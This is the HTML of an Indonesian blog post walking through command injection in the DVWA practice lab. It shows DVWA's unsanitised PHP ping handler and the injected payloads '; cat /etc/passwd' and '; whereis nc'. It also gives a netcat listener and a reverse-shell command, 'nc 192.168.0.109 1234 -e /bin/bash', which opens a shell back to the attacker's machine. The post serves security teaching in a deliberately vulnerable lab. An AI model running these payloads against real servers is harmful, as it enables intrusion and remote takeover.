@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  <meta http-equiv="content-language" content="en-us" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+  
+  
+  <title>DVWA - Command Injection &middot; Wildan&#39;s Workspace</title>
+  <meta name="title" content="DVWA - Command Injection &middot; Wildan&#39;s Workspace" />
+  
+
+  
+  
+  <meta name="description" content="Command injection is a simple yet still pretty common and relevant vulnerability in the real world even nowadays..." />
+  
+  <meta name="keywords" content="docker, DVWA, web, hacking, command injection, reverse shell, " />
+  <link rel="canonical" href="http://localhost:1313/tech/commandinjection/" />
+
+  
+
+  
+    
+        <link rel="stylesheet" href="/css/theme.css">
+    
+  
+    
+        <link rel="stylesheet" href="/css/main.css">
+    
+  
+    
+  
+
+
+  
+
+
+  
+
+
+
+  
+    
+        <script src="/js/theme.js"></script>
+      
+    
+  
+
+  
+    
+        <script src="/js/codecopy.js"></script>
+      
+    
+  
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+
+  <meta property="og:url" content="http://localhost:1313/tech/commandinjection/">
+  <meta property="og:site_name" content="Wildan&#39;s Workspace">
+  <meta property="og:title" content="DVWA - Command Injection">
+  <meta property="og:description" content="Command injection is a simple yet still pretty common and relevant vulnerability in the real world even nowadays…">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="tech">
+    <meta property="article:published_time" content="2024-10-13T17:04:53+07:00">
+    <meta property="article:modified_time" content="2024-10-13T17:04:53+07:00">
+    <meta property="article:tag" content="Docker">
+    <meta property="article:tag" content="DVWA">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Hacking">
+    <meta property="article:tag" content="Command Injection">
+    <meta property="article:tag" content="Reverse Shell">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="DVWA - Command Injection">
+  <meta name="twitter:description" content="Command injection is a simple yet still pretty common and relevant vulnerability in the real world even nowadays…">
+
+
+  
+  
+
+
+
+
+
+
+  
+  
+
+
+  
+  
+  
+  
+  
+
+  
+  
+  
+    <link rel="preload" href="http://localhost:1313/fonts/Ubuntu-Regular.woff2" as="font" type="font/woff2" crossorigin>
+  
+
+  
+
+</head>
+
+  <body>
+    <script>
+      const siteTheme = "auto";
+      let savedTheme = localStorage.getItem('theme') || siteTheme;
+      if (savedTheme == 'auto') {
+        if ( window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ) {
+          savedTheme = 'dark';
+        }
+      }
+      if (savedTheme === "dark") {
+        document.body.classList.add('dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    </script>
+    <div class="content">
+      <header>
+    
+    <a class="title" href="/">
+      <img alt="Site Logo" src="/tsukasa.png" />
+    </a>
+    
+    <div class="header-cntr">
+    <a class="title" href="/">
+    <span>Wildan's Workspace</span>
+    </a>
+  <div class="menu">
+  <nav id="main-menu" class="mm-normal">
+    <ul>
+    <li> <button id="mob-x-icon" class="menu-btn" arial-label="x-icon"> 
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+
+ </button> </li>
+    
+      <li><a href="/tech/" aria-label="tech">
+      Tech</li></a>
+    
+      <li><a href="/chess/" aria-label="chess">
+      Chess</li></a>
+    
+    </ul>
+  </nav>
+    <div class="side-menu">
+    
+    <button id="theme-switcher" class="menu-btn" aria-label="Theme switcher">
+      <div id="moon">
+      
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+
+
+      </div>
+      <div id="sun">
+      
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+
+
+      </div>
+    </button>
+    
+    </div>
+    <button id="mob-hb-icon" class="menu-btn" aria-label="Hamburger icon">
+      
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+
+
+    </button>
+  </div>
+  <script>
+  (function() {
+    document.addEventListener('DOMContentLoaded', function() {
+    const openBtn = document.getElementById('mob-hb-icon');
+    const closeBtn = document.getElementById('mob-x-icon');
+    const mainMenu = document.getElementById('main-menu');
+    const body = document.body;
+
+    openBtn.addEventListener('click', function() {
+        mainMenu.classList.replace('mm-normal', 'mm-mobile-open');
+        closeBtn.style.display = 'block';
+        body.style.overflow = 'hidden';
+    });
+    closeBtn.addEventListener('click', function() {
+        mainMenu.classList.replace('mm-mobile-open', 'mm-normal');
+        closeBtn.style.display = 'none';
+        body.style.overflow = '';
+    });
+    })
+  })();
+  </script>
+  
+  <script>
+  (function() {
+    var mainmenu = document.getElementById('main-menu');
+    if (!mainmenu) return;
+
+    var path = window.location.pathname;
+    var links = mainmenu.querySelectorAll('a');
+
+    links.forEach(function(link) {
+      if (link.getAttribute('href') === path) {
+        link.classList.add('active');
+      }
+    });
+  })();
+  </script>
+  
+</div>
+</header>
+
+      <main>
+        
+
+
+
+
+<ul class="breadcrumbs">
+  <li><a href="http://localhost:1313/">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--!Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2024 Fonticons, Inc.--><path fill="currentColor" d="M575.8 255.5c0 18-15 32.1-32 32.1l-32 0 .7 160.2c0 2.7-.2 5.4-.5 8.1l0 16.2c0 22.1-17.9 40-40 40l-16 0c-1.1 0-2.2 0-3.3-.1c-1.4 .1-2.8 .1-4.2 .1L416 512l-24 0c-22.1 0-40-17.9-40-40l0-24 0-64c0-17.7-14.3-32-32-32l-64 0c-17.7 0-32 14.3-32 32l0 64 0 24c0 22.1-17.9 40-40 40l-24 0-31.9 0c-1.5 0-3-.1-4.5-.2c-1.2 .1-2.4 .2-3.6 .2l-16 0c-22.1 0-40-17.9-40-40l0-112c0-.9 0-1.9 .1-2.8l0-69.7-32 0c-18 0-32-14-32-32.1c0-9 3-17 10-24L266.4 8c7-7 15-8 22-8s15 2 21 7L564.8 231.5c8 7 12 15 11 24z"/></svg>
+
+
+</a></li>
+  
+    
+    
+      <li><a href="http://localhost:1313/tech/">Teches</a></li>
+    
+    
+  
+    
+  
+</ul>
+
+
+
+<h1 class="pg-title">DVWA - Command Injection</h1>
+
+
+<div class="meta">
+  
+
+
+
+<p>
+
+
+  
+  
+  <span class="meta-icon">
+
+    <?xml version="1.0" encoding="utf-8"?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg fill="currentColor" width="800px" height="800px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19,4H17V3a1,1,0,0,0-2,0V4H9V3A1,1,0,0,0,7,3V4H5A3,3,0,0,0,2,7V19a3,3,0,0,0,3,3H19a3,3,0,0,0,3-3V7A3,3,0,0,0,19,4Zm1,15a1,1,0,0,1-1,1H5a1,1,0,0,1-1-1V12H20Zm0-9H4V7A1,1,0,0,1,5,6H7V7A1,1,0,0,0,9,7V6h6V7a1,1,0,0,0,2,0V6h2a1,1,0,0,1,1,1Z"/></svg>
+
+
+</span>
+  Posted on <time datetime="2024-10-13T17:04:53&#43;07:00">Oct 13, 2024</time>
+  
+  
+  
+
+
+  <span class="meta-icon">
+
+    <?xml version="1.0" encoding="utf-8"?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg width="800px" height="800px" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+<path d="M23 12C23 18.0751 18.0751 23 12 23C5.92487 23 1 18.0751 1 12C1 5.92487 5.92487 1 12 1C18.0751 1 23 5.92487 23 12ZM3.00683 12C3.00683 16.9668 7.03321 20.9932 12 20.9932C16.9668 20.9932 20.9932 16.9668 20.9932 12C20.9932 7.03321 16.9668 3.00683 12 3.00683C7.03321 3.00683 3.00683 7.03321 3.00683 12Z" fill="currentColor"/>
+<path d="M12 5C11.4477 5 11 5.44771 11 6V12.4667C11 12.4667 11 12.7274 11.1267 12.9235C11.2115 13.0898 11.3437 13.2343 11.5174 13.3346L16.1372 16.0019C16.6155 16.278 17.2271 16.1141 17.5032 15.6358C17.7793 15.1575 17.6155 14.5459 17.1372 14.2698L13 11.8812V6C13 5.44772 12.5523 5 12 5Z" fill="currentColor"/>
+</svg>
+
+
+</span>
+  
+    4 mins
+  
+
+
+</p>
+
+  
+
+
+<p>
+  <span class="meta-icon"> 
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M48 32H197.5C214.5 32 230.7 38.74 242.7 50.75L418.7 226.7C443.7 251.7 443.7 292.3 418.7 317.3L285.3 450.7C260.3 475.7 219.7 475.7 194.7 450.7L18.75 274.7C6.743 262.7 0 246.5 0 229.5V80C0 53.49 21.49 32 48 32L48 32zM112 176C129.7 176 144 161.7 144 144C144 126.3 129.7 112 112 112C94.33 112 80 126.3 80 144C80 161.7 94.33 176 112 176z"/></svg>
+
+
+ </span>
+  
+  <a class="tag" href="/tags/docker/">Docker</a>
+  
+  <a class="tag" href="/tags/dvwa/">DVWA</a>
+  
+  <a class="tag" href="/tags/web/">Web</a>
+  
+  <a class="tag" href="/tags/hacking/">Hacking</a>
+  
+  <a class="tag" href="/tags/command-injection/">Command Injection</a>
+  
+  <a class="tag" href="/tags/reverse-shell/">Reverse Shell</a>
+  
+</p>
+
+
+
+</div>
+
+
+
+
+
+
+
+<p>Sesuai dengan namanya, <em><strong>Command Injection</strong></em> adalah kerentanan pada aplikasi web yang memungkinkan seorang penyerang dapat meng-<em>execute</em> perintah-perintah sistem operasi. Misalnya, <em>commands</em> sistem operasi Linux ada <strong><code>pwd</code></strong>, <strong><code>ls</code></strong>, <strong><code>cat</code></strong>, dan lain sebagainya. <em>Command injection</em> dapat terjadi disebabkan oleh tidak kurangnya perhatian seorang developer web terhadap <strong>validasi input</strong>.<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
+<p>Untuk membuktikan, kita mula-mula akan melihat demonstrasinya command injection terlebih dahulu melalui DVWA yang sudah kita <em>install</em> dan <em>set up</em> di artikel sebelumnya. Setelah login ke DVWA dengan credensial default, <mark> <strong>admin:password</strong></mark>, pergi ke menu <strong>Command Injection</strong>. Di sana, ada <em>form</em> <strong><code>ping</code></strong> dan kita bisa meng-<em>input</em>-kan <em>ip address</em> untuk di-<strong><code>ping</code></strong>. Kita bisa coba dengan memasukkan <em>ip address</em> komputer kita dan nanti <em>output</em> <strong><code>ping</code></strong>-nya akan tampil di bawah <em>form</em> tersebut.</p>
+<div style="display: flex; justify-content: center;">
+  <video width="80%" controls autoplay loop muted>
+    <source src="/commandinjection/vid1.mp4" type="video/mp4">
+  </video>
+</div>
+<p>Sekarang, kita akan lihat <em>source code</em> yang ada di belakangnya, berikut:</p>
+<blockquote>
+<p><strong>Notes:</strong> <em>Source code</em>-nya bisa dilihat di bagian bawah halaman website pada bagian <strong>&ldquo;View Source&rdquo;</strong></p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">isset</span>( $_POST[ <span style="color:#e6db74">&#39;Submit&#39;</span> ]  ) ) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Get input
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $target <span style="color:#f92672">=</span> $_REQUEST[ <span style="color:#e6db74">&#39;ip&#39;</span> ];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Determine OS and execute the ping command.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">stristr</span>( <span style="color:#a6e22e">php_uname</span>( <span style="color:#e6db74">&#39;s&#39;</span> ), <span style="color:#e6db74">&#39;Windows NT&#39;</span> ) ) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Windows
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $cmd <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>( <span style="color:#e6db74">&#39;ping  &#39;</span> <span style="color:#f92672">.</span> $target );
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// *nix
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $cmd <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>( <span style="color:#e6db74">&#39;ping  -c 4 &#39;</span> <span style="color:#f92672">.</span> $target );
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Feedback for the end user
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;</span><span style="color:#e6db74">{</span>$cmd<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/pre&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Perhatikan bahwa pada variable <strong><code>$cmd</code></strong> yang mengambil input dari <em>user</em> untuk kemudian dieksekusi, yaitu $cmd = <strong><code>shell_exec( 'ping  ' . $target );</code></strong> jika DVWA di-host di server Windows dan <strong><code>$cmd = shell_exec( 'ping  -c 4 ' . $target );</code></strong> jika DVWA di-<em>deploy</em> di Linux, tidak ada validasi / sanitasi <em>input</em>-nya. Itu artinya, kita dapat melakukan <em>command injection</em> dengan mem-<em>bypass</em> perintah <strong><code>ping</code></strong> di server dengan karakter yang umum digunakan untuk melakukan serangan <em>command injection</em>, yaitu <em>semicolon</em> <strong>(:)</strong> sehingga <em>attacker</em> dapat memberikan perintah lain ke server.</p>
+<p><mark> Karakter <em>semicolon</em> <strong>(;)</strong> adalah sebuah <em>standard item</em> dalam <em>environment</em> UNIX/Linux untuk memisahkan <em>commands</em></mark>.<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></p>
+<p>Misalnya, saya ingin melihat isi file <strong><code>/etc/passwd</code></strong> di server, saya dapat menambahkan karakter semicolon <strong>(;)</strong> yang diikuti dengan perintah <strong><code>cat /etc/passwd</code></strong> setelah menuliskan <em>ip address</em> pada <em>form</em> <strong><code>ping</code></strong> tersebut:</p>
+
+<p><details >
+  <summary markdown="span"><strong>Info: /etc/passwd</strong></summary>
+  <p>File <strong><code>/etc/passwd</code></strong> dalam sistem operasi linux menyimpan semua data user yang terdaftar di sistem operasi tersebut, baik <em>system/service user</em> seperti <strong>www-data</strong>, <strong>mysql</strong>, <strong>sshd</strong>, dan lainnya maupun <em>login user</em> seperti saya sendiri sebagai pengguna komputer.</p>
+<p>Sebagai ilustrasi, dalam mesin saya, berikut adalah isi file <strong><code>/etc/passwd</code></strong>-nya:</p>
+<p><img loading="lazy" src="/commandinjection/ss1.png" alt="ss1"  title="/etc/passwd"  />
+</p>
+
+</details></p>
+
+
+<p><img loading="lazy" src="/commandinjection/ss2.png" alt="ss2"  title="command injection cat /etc/passwd"  />
+</p>
+<p>Kita bisa lihat <em>output</em> yang ditampilkan di website, mula-mula perintah <strong><code>ping -c 4 192.168.0.109</code></strong> dieksekusi (menge-<strong><code>ping</code></strong> / mengirimkan paket <strong>ICMP</strong> - <em>Internet Control Message Protocol</em> ke <em>ip address</em> 192.168.0.109 ) terlebih dahulu ke server, kemudian perintah <strong><code>cat /etc/passwd</code></strong> dieksekusi setelahnya.</p>
+<p>Atau jika kita ingin perintahnya lebih sederhana, kita bisa hanya mengetikkan perintah <strong><code>; cat /etc/passwd</code></strong> tanpa harus mengetikkan ip address-nya terlebih dahulu karena tadi, fungsi karakter <em>semicolon</em> adalah memisahkan dua perintah atau lebih, jadi perintah pertama akan dieksekusi (jika ada) dan kemudian perintah kedua akan dieskekusi.</p>
+<p><img loading="lazy" src="/commandinjection/ss3.png" alt="ss3"  title="simpler command injection cat /etc/passwd"  />
+</p>
+<p>Sekarang kita paham bahwa dalam konteks ini, kerentanan <em>command injection</em> di website mengakibatkan <em>attacker</em> dapat mengeksekusi perintah sistem operasi apapun dari website. Itu juga berarti bahwa <em>attacker</em> dapat melakukan <a href="https://integrasolusi.com/blog/pentesting-perbandingan-bind-shell-dan-reverse-shell/" target="_blank"><em><strong>reverse shell</strong></em></a>
+ untuk mendapatkan <em>shell</em> server. Ketika <em>attacker</em> sudah berhasil mendapatkan <em>shell</em>, itu artinya server sudah berhasil &ldquo;dibajak&rdquo;.</p>
+<p>Untuk demonstrasi <em>reverse shell</em>, saya akan menggunakan <a href="https://www.geeksforgeeks.org/introduction-to-netcat/" target="_blank"><strong><code>netcat</code></strong></a>
+:</p>
+<p>Pertama, kita perlu mengecek / memastikan dulu bahwa <strong><code>netcat</code></strong> / <strong><code>nc</code></strong> ter-<em>install</em> di dalam di server dengan mengetikkan perintah berikut di <em>form</em> <strong><code>ping</code></strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>; whereis nc
+</span></span></code></pre></div><p><img loading="lazy" src="/commandinjection/ss4.png" alt="ss4"  title="checking netcat in the server"  />
+</p>
+<p><strong><code>Netcat</code></strong> ada di dalam server. Kita bisa melakukan <em>reverse shell</em> sederhana dengan <strong><code>netcat</code></strong>.</p>
+<p>Mula-mula, kita jalankan <strong><code>netcat</code></strong> di komputer kita (sebagai <em>attacker</em>) terlebih dahulu untuk melakukan <em>listening</em> paket:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">1234</span>
+</span></span></code></pre></div><blockquote>
+<p><strong>Keterangan:</strong></p>
+<ul>
+<li><mark> -l</mark> : melakukan <em>listening</em>.</li>
+<li><mark> -v</mark> : melakukan <em>verbosity</em>.</li>
+<li><mark> -n</mark> : <em>ip address</em> tanpa DNS.</li>
+<li><mark> -p</mark> : port yang akan melakukan <em>listening</em>.</li>
+<li><mark> 1234</mark> : nomor port-nya.</li>
+</ul>
+<p>Untuk info lebih lanjut, bisa baca-baca di <strong><code>man nc</code></strong>.</p>
+</blockquote>
+<p>Perintah di server (di <em>form</em> <strong><code>ping</code></strong>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc 192.168.0.109 <span style="color:#ae81ff">1234</span> -e /bin/bash
+</span></span></code></pre></div><blockquote>
+<p><strong>Keterangan:</strong></p>
+<ul>
+<li><mark> 192.168.0.109</mark> : <em>ip address attacker</em>.</li>
+<li><mark> 1234</mark> : port <em>attacker</em> yang sedang <em>listening</em>.</li>
+<li><mark> -e</mark> : <em>binary</em> / perintah yang mau dieksekusi.</li>
+<li><mark> /bin/bash</mark> : memberi akses BASH shell ke <em>attacker</em>.</li>
+</ul>
+<p>Untuk info lebih lanjut, bisa baca-baca di <strong><code>man nc</code></strong>.</p>
+</blockquote>
+<div style="display: flex; justify-content: center;">
+  <video width="100%" controls autoplay loop muted>
+    <source src="/commandinjection/vid2.mp4" type="video/mp4">
+  </video>
+</div>
+<p>Dan kita berhasil mendapatkan <em>shell</em> server-nya sebagai user <strong>www-data</strong>.</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p><a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank">https://owasp.org/www-community/attacks/Command_Injection</a>
+&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p><a href="https://www.ibm.com/support/pages/meaning-semi-colon-colon-unix-script-sterling-gentranserver-unix" target="_blank">https://www.ibm.com/support/pages/meaning-semi-colon-colon-unix-script-sterling-gentranserver-unix</a>
+&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+<nav class="pagenav">
+  
+  <div></div>
+  
+  
+    <a class="next" href="/tech/dvwa-docker/">
+      <span class="direction">Next »</span>
+      <br>
+      <span> Step by Step DVWA Installation for Web App Hacking </span>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+
+
+      </main>
+      <footer>
+  <div class="copyright">
+     © 2024  Abdullah Wildan Ulhaq 
+  </div>
+  
+  <div class="attribution">
+    Built with <a href="https://gohugo.io" target="_blank">Hugo</a> & <a href="https://github.com/mnjm/kayal" target="_blank">Kayal</a>
+  </div>
+  
+</footer>
+
+    </div>
+  </body>
+</html>
